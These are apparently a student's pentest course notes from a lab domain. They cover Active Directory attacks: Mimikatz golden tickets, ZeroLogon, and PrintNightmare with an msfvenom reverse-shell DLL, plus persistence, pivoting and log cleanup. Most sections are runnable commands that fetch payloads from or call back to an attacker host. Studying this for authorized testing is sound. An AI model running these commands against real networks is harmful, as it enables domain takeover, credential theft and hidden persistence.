- <span style="color:#00b050">this is the result:</span>![[Pasted image 20240304114012.png]]

keep in mind that:
the PC passwords (`HYDRA-DC$, SPIDERMAN$...`) -->  are useless to decrypt
=>
focus on the -->  accounts

#### Golden Tickets Attack Overview
read again [[Notes_ETH#Kerberoasting|Kerberoasting]]

when we compromise the:
KeRBeros Ticket Granting Ticket (KRBTGT) account =>   we own the domain
=>
<span style="color:#00b050">we can request</span> -->  any resource or system on the domain

what we want:
a Golden tickets -->  that is a <span style="color:#00b050">complete access to every machine</span> 

we'll use [[Notes_ETH#Mimikatz|Mimikatz]] -->  to retrieve some information  (that we need)
<span style="background:#fff88f">we need:</span>
 - the KRBTGT NTLM hash
 - the domain SID

with these 2 data -->  <span style="color:#00b050">we generate our Golden tickets</span>

<span style="background:#fff88f">after having generated the Golden tickets:</span>
we can use the "pass the ticket attack" -->  to <span style="color:#00b050">utilize the ticket anywhere</span>

with this ticket:
<span style="color:#00b050">we can access every machine</span> <span style="color:#00b050">on the DOMAIN</span>

##### Attack
#AD_tool
turn on THEPUNISHER and Domain Controller
from the Domain Controller -->  install [[cheet#Install mimikatz on victim machine|mimikatz]]
- `mimikatz.exe`
- `privilege::debug`
- `lsadump::lsa /inject /name:krbtgt`    -->  pull down only the kerberos tgt account
  ![[Pasted image 20240304121920.png]]
- open a notepad
- copy the SID and the KRBTGT NTLM hash
- `kerberos::golden /User:Administrator /domain:marvel.local /sid:<copytheSID> /krbtgt:<copytheKRBTGT> /id:500 /ptt`
  `/User:...` -->  can be anything (even a fake account)
  `/id:500` -->  is the admin account
  `/ptt` -->  pass the ticket
  =>
  we are:
  - generating -->  a golden ticket
  - passing it to -->  pass the ticket
                 to use this ticket inside our session (the command line)
                 =>
                 we are going to -->     - open a new terminal
                                     - that has this ticket
                                     - from which we can -->  <span style="color:#00b050">ACCESS ANY PC IN THE </span>
                                                         _<span style="color:#00b050">DOMAIN</span> 
    =>
    ![[Pasted image 20240304122817.png]]

- `misc::cmd`    to open new terminal with the ticket loaded
  =>
  from here -->  <span style="color:#00b050">we can access to any PC in the domain</span>
  example:
  access the THEPUNISHER C drive:
  `dir \\THEPUNISHER\c$`
  ![[Pasted image 20240304123147.png]]

<span style="background:#fff88f">what can we do now:</span>
- we can download here [[cheet#psexec.py|psexec]] 
- <span style="color:#00b050">gain access to THEPUNISHER machine</span> 
  example:
  `psexec.exe \\THEPUNISHER cmd.exe`

### Additional AD Attacks
- <span style="color:#00b050">ZeroLogon</span> -->  if you miss something in this attac
- <span style="color:#00b050">PrintNightmare</span>
- <span style="color:#00b050">Sam the Admin</span>

it's worth checking for these vuln -->  but you shouldn't exploit them unless with client approves

how to check:
there are tools for checking if -->  a domain is affected by these vuln

#### Abusing ZeroLogon
#AD_tool
It's a dangerous attack to run
<span style="background:#fff88f">what is capable of doing:</span>
- attacking a Domain Controller
- setting the domain controller password -->  to <span style="color:#00b050">null</span>
- take over the domain controller

> [!warning] If you don't restore the password
we will -->  break the Domain Controller

- clone this [repo](https://github.com/dirkjanm/CVE-2020-1472)
- you must have:
	- the latest Impacket tool version
	- python >= 3.7
- cd the repo
- save from this [repo](https://github.com/SecuraBV/CVE-2020-1472) -->  the `zerologon_tester.py` 
- put it inside the first repo that you cloned
- this script checks if the domain is vulnerable to Zerologon attack:
  =>
  `python3 zerologon_tester.py HYDRA-DC <domain controller IP>`
  ![[Pasted image 20240304152050.png]]
- in this way you can inform your client that:
	- he is vulnerable to this attack
	- he can fix it (without demonstrate with the real exploit)

if you want to run the attack:
- `python3 cve-2020-1472-exploit.py HYDRA-DC <domain controller IP>`
  ![[Pasted image 20240304152439.png]]
- to check if the script has changed the Domain Controller password:
  `secretsdump.py -just-dc MARVEL/HYDRA-DC\$@<domain controller IP>`
- at this point we own this Domain Controller

<span style="background:#fff88f">How to restore to the previous password:</span>
- copy the entire Administrator hash
- `secretsdump.py administrator@<domain controller IP> -hashes <hash>`
- search in the result -->  `MARVEL\HYDRA-DC$: plain_password_hex`
- copy this value
- `python3 restorepassword.py MARVEL/HYDRA-DC@HYDRA-DC -target-ip <domain controller IP> -hexpass <the previous copied value>`
  ![[Pasted image 20240304152955.png]]
- <span style="color:#00b050">password restored</span>

#### PrintNightmare (CVE-2021-1675)
#AD_tool
This is a -->  post compromised attack

This attack takes advantage of -->  <span style="color:#00b050">printer spooler</span>
bc it allows:
users to add printers that run as -->  <span style="color:#00b050">system privilege</span> 
=>
any authenticated attacker can -->  <span style="color:#00b050">code execution</span>

First thing:
- the steps are described in this [repo](https://github.com/cube0x0/CVE-2021-1675)
- check if the victim domain is vulnerable:
  `rpcdump.py @<domain controller IP> | egrep 'MS-RPRN|MS-PAR'`
  ![[Pasted image 20240304153716.png]]
  if we obtain this =>  <span style="color:#00b050">domain controller is vulnerable</span>

=>
##### Update/install Impacket
to run the attack:
- update impacket
	- `pip3 uninstall impacket`
	- `git clone https://github.com/cube0x0/impacket`
	- `cd impacket`
	- `python3 ./setup.py install`
	  
- from the repo below:
	- copy the code in the `CVE-2021-1675.py`
	- save it locally inside the impacket folder

- we need to create a malicious DLL and host it:
	- create a malicious DLL:
		- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker IP> LPORT=5555 -f dll > shell.dll`
	- set up the listener:
		- `msfconsole`
		- `use multi/handler`
		- `options`
		- `set payload windows/x64/meterpreter/reverse_tcp`
		- `set LPORT 5555`
		- `set LHOST LHOST=<attacker IP>`
		- run
	- set up a file share:   (we need to share the shell.dll)
		- `smbserver.py share 'pwd'`
=>
we have set up everything
Now:
<span style="background:#fff88f">we need only to run the attack:</span>
- go inside the impacket folder
- `python3 CVE-2021-1675.py marvel.local/fcastle:Password1@<domain controller IP> \\<attacker IP (to go the file share)\share\shell.dll> `
> [!warning] if it fails
> set up the file share with the `-smb2support` option
> =>
> `smbserver.py share 'pwd' -smb2support`
> 
> run again the attack

=>
<span style="color:#00b050">we can dump all the hashes</span>

### AD Case Study 
#### AD Case Study 1
we are going to see 3 case studies where all the attacks that we saw didn't work
so you need something else

scenario:
- internal pentest (in an US hospital)
- they spent a lot of money in Defences:
	- IPv6 disabled => no mitm6 attack
	- IDS/IPS
	- CyberArk =>  tools that makes responder useles
	  
what are we missing?
- nothing about [[Notes_ETH#SMB Relay Attack|smb Relay Attack]]
  =>
  indeed this attack worked
- they could relay on a machine that had -->  <span style="color:#00b050">smb signing disabled</span>
- from here they could dump -->  all the hashes of the users (include the Administrator)
- By cracking the hashes -->  they found one password
- with it they had a shell

what is the lesson here:
- this client spent a lot in security
- but miss some basics locally configuration -->  as <span style="color:#00b050">smb signing disabled</span>

1) **Enable SMB Signing (and disabled LLMNR)** – If I do not have the ability to perform the relay attack, I don’t get my initial shell.  While the possibility of other footholds exist, eliminating any potential foothold can slow down or completely prevent an attacker (motivation dependent, of course).

2) **Least privilege** – I know this is easier said than done, but preventing users from being administrators on their machine (and especially multiple machines) goes a long way in regards to properly securing your network.

3) **Account tiering** – If Bob is a domain admin, then Bob should have at least two domain accounts.  One account for everyday use and one account that one logs into the domain controller with when absolutely necessary.  Having a domain admin be part of an LLMNR or relay attack could signal game over immediately if weak policies are in place.

4) **DON’T REUSE YOUR PASSWORDS** – This should make sense by now, yeah?  Not only should you have strong passwords, but you should also only being using the passwords one time only.  If an attacker gets shell access to a machine and dumps the hash, the hash/password should work nowhere else.  It certainly shouldn’t work on nearly every computer in the network and it certainly shouldn’t disable endpoint protection.



#### AD Case Study 2
scenario:
- internal pentest (in an US hospital)
- they spent a lot of money in Defences:
	- IPv6 disabled => no mitm6 attack
	- no LLMNR
	- SMB Signing enabled
	- IDS/IPS
	- A/V on all devices

we can't perform any of the easy attacks
=>
start thinking outside the box:
<span style="color:#00b050">what is available in the network?</span> 
look for printers/devices/default credentials

what they found:
- they found a tool in development -->  that has a password in clear text:
                                  _<span style="color:#00b050">Local Administrative Password: ...</span>
- we don't know the user associated to it
  =>
  but we can try with the administrator user
- they tried with [[cheet#crackmapexec]] -->  and they found a machine
- now they ran -->  [[cheet#secretsdump]] -->  to find any relevant info
	- by dumping hashes they found that:
		- the Administrator and admin account had the same hash
		  =>
		  they ran again -->  crackmapexec with the new account found
		  
We can also often find cleartext credentials.  
Sometimes, these cleartext credentials show up in the form of <span style="color:#00b050">WDigest</span>, which is enabled by default on Windows 7, Windows 8, Windows Server 2008 R2, and Windows Server 2012.

<span style="background:#fff88f">What’s so special about WDigest?</span> 
It stores the credentials of any user that has logged into that machine since it has been turned on in clear text.  Imagine an environment where devices are still running on older versions of Windows.  This is pretty common in hospitals.  
Now imagine we log onto a machine that is vulnerable and a domain administrator has logged into it as well.

We’ll capture a domain administrator’s password in clear text, as such:
![[Pasted image 20240304163216.png]]
As you can see above, we have managed to dump out two accounts.  Both of which were domain admins.

Once we have our domain administrator password, we can go log into the domain controller

lessons learned:
- No default credentials
- turn off WDigest
- Don’t give service accounts Domain Admin access
- DON’T REUSE YOUR PASSWORDS



#### AD Case Study 3
scenario:
- there we LLMNR on 
- but no local admin into all the machines
- => they found a lot of accounts (but not admin)

but:
- one device had access to -->  file share
  =>
  they found a -->  Macbook Pro Setup Procedure
- inside it they found in clear text -->  an "admin" account and a password
- using crackmapexec -->  they found one machine where they could access inside it
=>
lesson:
think outside the box

# Post Exploitation
we'll cover at high level
we'll see:
- information gathering
- scanning and enumeration
- exploitation

## File transfers
Usually as attacker we -->  host files
### Host a file 
navigate to the directory where you have your files that you want to be hosted:
`python3 -m http.server 80`
or
`python3 -m pyftpdlib 21`

### Retrieve a file
#### Windows
`certutil.exe -urlcache -f http://10.10.10.10/file filename_for_download`
#### Linux
`wget http://10.10.10.10/file`


<span style="background:#fff88f">If `certutil` and `wget` are not working:</span>
`python3 -m pyftpdlib 21`   -->  from the attacker
`ftp 10.10.10.10`                  -->  from the victim

### Metasploit
if you have a meterpreter shell -->  you can use the features `upload/download`
                               to download and upload a file

## Maintaining Access
During a pentest work -->  usually you don't need to persist your access
in a red team assessment:
YES

what usually you can do:
- add a user -->  `net user hacker password123/add`
- use [[cheet#psexec.py|psexec.py]] to get a shell -->  `sudo psexec.py domain/user:'password'@<victim ip>`

### Metasploit
`run persistence -h`
`exploit/windows/local/persistence`
`exploit/windows/local/registry_persistence`


>[!warning] This is dangerous
>bc you are -->  opening a port on the victim
>=>
>everyone can access to it 
>(usually there is no reason to do that)

#### Schedule task
Some precautions as before

`run scheduleme`
`run schtaskabuse`

what is a schedule task:
if you have a malware on a pc => this task will check like every 5 min 
                             =>
                             if the pc gets rebooted:
                             - the task runs again
                             - you'll get a shell again

## Pivoting
<span style="background:#fff88f">pivoting:</span>
 act of an attacker -->    - moving from 1 compromised system to 1 or more other systems 
                     - within the same or other organizations
 
imagine that you have compromised a machine:
- that machine allows you -->  access to 2 network interfaces
- these 2 networks -->  share a new network
                     that was originally unavailable to you

what we can do:
- set up a -->   <span style="color:#00b050">proxy</span> 
- pivot through that 

you can do with 2 tools:
- proxychains
- sshuttle

<span style="background:#fff88f">scenario:</span>
- we have compromised a machine
- we have ssh access to it as root
- doing an `ip a` -->  we find 2 IPs:
                    - `10.10.155.5` -->  machine IP
                    - `10.10.10.5` -->  the network that we don't have access

if we try with a new tab to ping the network:
=>
we don't receive response -->  bc we don't have access to it
=>
<span style="background:#fff88f">what we need:</span>
<span style="color:#00b050">establish a pivot</span>:
- <span style="color:#00b050">from</span> the victim machine (`10.10.155.5`)
- <span style="color:#00b050">to</span> the network (`10.10.10.5`)
=>
so that we can -->  <span style="color:#00b050">access to the network</span>

### Proxychains
#AD_tool
first we need to look at -->  proxychains config file
`cat /etc/proxychains.conf` 
![[Pasted image 20240305140259.png]]
we'll use the port 9050 -->  to bind to
=>
`ssh -f -N -D 9050 -i pivot root@10.10.155.5`
`-i` -->  identity (is a file for login)
`-f` -->  run ssh in background
`-N` -->  we don't want to execute command (it's ideal for port forwarding)
`-D` -->  we want to bind the port on port 9050
=>
what happen when we type enter:
![[Pasted image 20240305140741.png]]
we establish a connection with the victim machine in background
=>
now we can -->  <span style="color:#00b050">proxy our traffic through this machine to access the next network</span> 
=>
what can we do:
different things:
- run nmap through proxychains:
  `proxychains nmap -p88 10.10.155.5`       (port 88 bc in this example there is Domain                                                                                         Controller on this port)
- run attacks:
  run [[Notes_ETH#Kerberoasting|kerberoasting attack]]:
  `proxychains GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 10.10.155.5 -request`
  (after we can decrypt the hash)
  
- access the machine:
  `proxychains xfreerdb /u:administrator /p:'Hacker321!' /v:10.10.155.5

- open the browser:
  `proxychains firefox`

### sshuttle
#AD_tool
`sshuttle -r root@10.10.155.5 10.10.10.0/24 --ssh cmd "ssh -i pivot"`
- run this `root@10.10.155.5`
- through that user -->  establish a connection to this `network 10.10.10.0/24`
- run the ssh command `"ssh -i pivot"`

as long as this terminal is open and the connection is established:
=>
we can send command to the network as below:
`nmap -p88 10.10.155.5`  => without having to use proxychains

### chisel
another tool is -->  [chisel](https://github.com/jpillora/chisel)

## Clean Up
from a pentest perspective:   (that is different from a hacker perspective)
the goal is -->  <span style="color:#00b050">leave the system/network as it was when you entered</span> 
=>
- remove executables, scripts, added files
- remove malware, rootkits, added users
- set settings back to original configurations

from a hacker perspective:
the goal is -->  <span style="color:#00b050">make it look like you were never there</span>
=>
- eliminating yourself from log files
- all the things above

# Web Application Enumeration (revisited)
we already seen:
- [[cheet#Nikto]]
- [[cheet#Dirbuster]]
- [[cheet#dirb]]
- [[cheet#BurpSuite]]

## Installing Go



